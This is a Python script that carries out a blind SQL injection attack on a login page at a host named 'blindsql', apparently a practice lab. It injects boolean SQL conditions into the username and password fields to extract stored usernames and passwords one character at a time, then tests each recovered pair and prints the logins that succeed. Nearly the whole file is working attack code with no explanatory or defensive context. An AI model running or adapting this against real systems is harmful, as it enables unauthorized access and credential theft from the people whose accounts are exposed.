#!/usr/bin/python3

import requests
import itertools as iter
from string import ascii_letters

from string import digits

import code

from urllib.request import urlopen

from bs4 import BeautifulSoup

from bs4 import Comment

import sys, getopt

MAX_FIELD_LENGTH = 24

def get_answer(params):

    r = requests.post('http://blindsql/blind/login.php',data=params)

    bsObj = BeautifulSoup(r.text, "lxml")

    if bsObj.find('div', {'class':'message'}).text == "You are successfully authenticated!":

        return True

    else:

        return False

def getUsersOptomized():
    partial = []
    done = []

    i = 97
    while i <= 122:
        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            done.append(str(chr(i)))
        params = {'userName': "' or length(username)!=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            partial.append(str(chr(i)))
        i += 1

    
    i = 97
    while i <= 122:
        for word in partial:
            params = {'userName': "' or length(userName)=2 and substring(userName, 1, 2)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                #partial.remove(word)
                done.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)!=2 and substring(userName, 1, 2)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                #partial.remove(word)
                partial.append(word + str(chr(i)))
        i += 1
    
    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=3 and substring(userName, 1, 3)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=3 and substring(userName, 1, 3)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1
    
    
    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=4 and substring(userName, 1, 4)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=4 and substring(userName, 1, 4)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1
    

    i = 97
    while i <= 122:
        
        for word in partial:
            
            params = {'userName': "' or length(userName)!=5 and substring(userName, 1, 5)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=5 and substring(userName, 1, 5)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1

    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=6 and substring(userName, 1, 6)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=6 and substring(userName, 1, 6)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1

    i = 97
    while i <= 122:
        for word in partial:
            
            params = {'userName': "' or length(userName)!=7 and substring(userName, 1, 7)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                partial.append(word + str(chr(i)))
            params = {'userName': "' or length(userName)=7 and substring(userName, 1, 7)=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(word + str(chr(i)))
        i += 1


    return done

def getPasswords(max_lenght):
    partial = []
    done = []
    

    for i in iter.chain(range(48,58), range(97, 123)):
        params = {'username': '', 'password': "' or length(password)=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
        if get_answer(params):
            done.append(str(chr(i)))
        params = {'username': '', 'password': "' or length(password)!=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
        if get_answer(params):
            partial.append(str(chr(i)))

    for x in range(1, max_lenght + 1):
        for word in partial:
            for i in iter.chain(range(48,58), range(97, 123)):
                params = {'username': '', 'password': "' or length(password)="+ str(x) + " and substring(password, 1, " + str(x) + " )=" + '\"' + word + str(chr(i)) + '\"' + " -- '"}
                if get_answer(params):
                    done.append(word + str(chr(i)))
                params = {'username': '', 'password': "' or length(password)!="+ str(x) + " and substring(password, 1, " + str(x) + " )=" + '\"' + word + str(chr(i)) + '\"' + " -- '"}
                if get_answer(params):
                    partial.append(word + str(chr(i)))

    return done

def matchPasswords(users, passwords):

       for user in users:
           for password in passwords:
                params = {'userName': user, 'password': password}
                #print (params)
                if get_answer(params):
                    print(user, ": ", password) 
def main():
    users = getUsersOptomized()
    passwords = getPasswords(8)
    matchPasswords(users, passwords)
main()
